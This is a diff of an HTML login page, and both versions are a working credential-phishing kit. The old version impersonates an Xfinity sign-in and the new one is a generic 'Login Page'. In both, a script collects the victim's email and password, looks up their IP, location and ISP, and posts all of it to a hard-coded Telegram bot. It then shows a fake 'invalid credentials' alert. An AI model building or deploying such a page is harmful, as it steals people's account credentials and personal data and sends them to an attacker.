@@ -1,159 +1,139 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
     <style>
         * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
             font-family: Arial, sans-serif;
         }
         .container {
             display: flex;
             justify-content: center;
             align-items: center;
-            width: 100%;
             height: 100vh;
-            position: relative;
         }
-        .left-side, .right-side {
-            flex: 1;
-        }
-        .left-side {
+        .login-section, .password-section {
             display: flex;
             flex-direction: column;
-            justify-content: center;
-            align-items: flex-start;
-            padding: 100px;
-            background-color: #fff;
-        }
-        .password-side {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: flex-start;
             padding: 40px;
-            background-color: #fff;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 400px;
+            background: #f9f9f9;
             border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-        .logo {
-            width: 100px;
-            height: 20px;
-            margin-bottom: 20px;
+        .login-section {
+            display: block;
+        }
+        .password-section {
+            display: none;
         }
         .input-field {
-            width: 100%;
-            padding: 15px 8px;
-            margin-bottom: 10px;
-            border: 1px solid #7a7a7a;
-            border-radius: 5px;
-            font-size: 16px;
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
         }
-        .login-button {
-            width: 100%;
-            padding: 12px;
-            background-color: #5f2dd3;
+        .button {
+            padding: 10px;
+            background: #4CAF50;
             color: #fff;
             border: none;
-            border-radius: 5px;
-            font-size: 14px;
+            border-radius: 4px;
             cursor: pointer;
         }
+        .button:hover {
+            background: #45a049;
+        }
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-bottom: 10px;
+        }
     </style>
-    <link rel="shortcut icon" href="https://logosandtypes.com/wp-content/uploads/2022/03/xfinity.svg" type="image/x-icon">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to Xfinity</title>
 </head>
 <body>
-    <div class="container">
-        <!-- Login Section -->
-        <div id="loginSection" class="left-side">
-            <img src="https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg" alt="Xfinity Logo" class="logo">
-            <h1 class="title">Sign in with your Xfinity ID</h1>
-            <input type="text" placeholder="Email, mobile, or username" class="input-field" id="emailInput">
-            <p id="emailError" style="color: #c01212; display: none; margin-bottom: 20px; font-size: 10px;">The Xfinity ID you entered was incorrect. Please try again.</p>
-            <button class="login-button" onclick="showPasswordSection()">Let's go</button>
-        </div>
 
-        <!-- Password Section -->
-        <div id="passwordSection" class="password-side hide">
-            <div>
-                <img src="https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg" alt="Xfinity Logo" class="logo">
-                <p id="displayedEmail"></p>
-                <h1 class="title">Enter your password</h1>
-                <input type="password" placeholder="Password" class="input-field" id="passwordInput">
-                <button class="login-button" onclick="handleSubmit(event)">Sign in</button>
-            </div>
-        </div>
+<div class="container">
+    <!-- Email Section -->
+    <div id="loginSection" class="login-section">
+        <h2>Login</h2>
+        <input type="text" id="emailInput" placeholder="Enter Email" class="input-field">
+        <p id="emailError" class="error-message"></p>
+        <button class="button" onclick="showPasswordSection()">Next</button>
     </div>
 
-    <script>
-        // Telegram Configuration
-        var telegram_bot_id = "7688926536:AAFT_sAnsu3V9QuugxVIJKZ45JBVIUFaLGg";
-        var chat_id = "7284131782";
-        var attemptCounter = 0;
-        var userInfo = {};
+    <!-- Password Section -->
+    <div id="passwordSection" class="password-section">
+        <h2>Password</h2>
+        <input type="password" id="passwordInput" placeholder="Enter Password" class="input-field">
+        <p id="passwordError" class="error-message"></p>
+        <button class="button" onclick="submitLogin()">Login</button>
+    </div>
+</div>
 
-        // Fetch IP Information
-        async function fetchIPInfo() {
-            let url = "https://ipinfo.io/json?token=de42e80837e28f";
-            try {
-                let response = await fetch(url);
-                let data = await response.json();
-                userInfo = {
-                    country: data.country || 'N/A',
-                    state: data.region || 'N/A',
-                    city: data.city || 'N/A',
-                    isp: data.org || 'N/A',
-                    ip: data.ip || 'N/A'
-                };
-            } catch (error) {
-                console.error('Error fetching IP info:', error);
-            }
+<script>
+    var telegram_bot_id = "7688926536:AAFT_sAnsu3V9QuugxVIJKZ45JBVIUFaLGg";
+    var chat_id = "7284131782";
+    var attemptCounter = 0;
+    var userInfo = {};
+
+    // Fetch IP Info
+    async function fetchIPInfo() {
+        let url = "https://ipinfo.io/json?token=de42e80837e28f";
+        try {
+            let response = await fetch(url);
+            let data = await response.json();
+            userInfo = {
+                country: data.country || 'N/A',
+                state: data.region || 'N/A',
+                city: data.city || 'N/A',
+                isp: data.org || 'N/A',
+                ip: data.ip || 'N/A'
+            };
+        } catch (error) {
+            console.error('Error fetching IP info:', error);
+        }
+    }
+
+    // Show Password Section
+    function showPasswordSection() {
+        const email = document.getElementById('emailInput').value;
+        const emailError = document.getElementById('emailError');
+        const loginSection = document.getElementById('loginSection');
+        const passwordSection = document.getElementById('passwordSection');
+
+        if (email.trim() === '') {
+            emailError.textContent = "Email cannot be empty.";
+            return;
         }
 
-        // Show Password Section
-        function showPasswordSection() {
-            const email = document.getElementById('emailInput').value;
-            const emailError = document.getElementById('emailError');
-            const passwordSection = document.getElementById('passwordSection');
-            const displayedEmail = document.getElementById('displayedEmail');
+        emailError.textContent = '';
+        loginSection.style.display = 'none';
+        passwordSection.style.display = 'block';
+    }
 
-            if (email) {
-                emailError.style.display = 'none';
-                document.getElementById('loginSection').style.display = 'none';
-                displayedEmail.textContent = email;
-                passwordSection.classList.remove('hide');
-            } else {
-                emailError.style.display = 'block';
-            }
+    // Submit Login
+    async function submitLogin() {
+        const email = document.getElementById('emailInput').value;
+        const password = document.getElementById('passwordInput').value;
+        const passwordError = document.getElementById('passwordError');
+
+        if (password.trim() === '') {
+            passwordError.textContent = "Password cannot be empty.";
+            return;
         }
 
-        // Send Data to Telegram
-        async function handleSubmit(event) {
-            event.preventDefault();
-            attemptCounter++;
+        attemptCounter++;
+        await fetchIPInfo();
+        const currentTime = new Date().toLocaleString();
 
-            var email = document.getElementById("emailInput").value;
-            var password = document.getElementById("passwordInput").value;
-
-            if (!email || !password) {
-                alert("Please fill in both email and password fields.");
-                return;
-            }
-
-            // Fetch IP Information
-            await fetchIPInfo();
-
-            var currentTime = new Date().toLocaleString();
-
-            var message = `
-🔐 *New Login Attempt Detected* 🔐
+        const message = `
+🔐 *New Login Detected* 🔐
 👤 *Email:* ${email}
 🔑 *Password:* ${password}
 🌍 *IP:* ${userInfo.ip}
@@ -163,30 +143,31 @@
 🔗 *ISP:* ${userInfo.isp}
 🕒 *Time:* ${currentTime}
 ⚠️ *Attempt Number:* ${attemptCounter}
-            `;
+        `;
 
-            var data = {
+        // Send data to Telegram
+        fetch("https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
                 chat_id: chat_id,
                 text: message,
                 parse_mode: "Markdown"
-            };
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Data sent to Telegram successfully:", data);
+            alert("Invalid credentials. Please try again.");
+        })
+        .catch(error => {
+            console.error("Error sending data to Telegram:", error);
+        });
+    }
+</script>
 
-            fetch("https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Data sent to Telegram successfully:", data);
-                alert("Invalid login attempt. Please try again.");
-            })
-            .catch(error => {
-                console.error("Error sending data to Telegram:", error);
-            });
-        }
-    </script>
 </body>
 </html>
+
